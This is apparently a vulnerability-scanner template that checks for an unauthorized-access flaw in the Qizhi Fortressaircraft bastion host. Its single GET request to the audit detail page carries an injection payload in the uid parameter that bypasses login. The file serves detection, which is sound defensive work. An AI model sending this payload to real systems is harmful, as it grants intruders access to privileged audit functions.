id: poc-qizhi-fortressaircraft-unauthorized
info:
  name: Qizhi Fortressaircraft Unauthorized Access
  author: ProjectDiscoveryAI
  severity: high
  tags: access-control
  description: |
    Detects unauthorized access vulnerability in Qizhi Fortressaircraft.

http:
  - method: GET
    path:
      - "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "错误的id"
          - "审计管理员"
          - "事件审计"
        part: body
      - type: status
        status:
          - 200
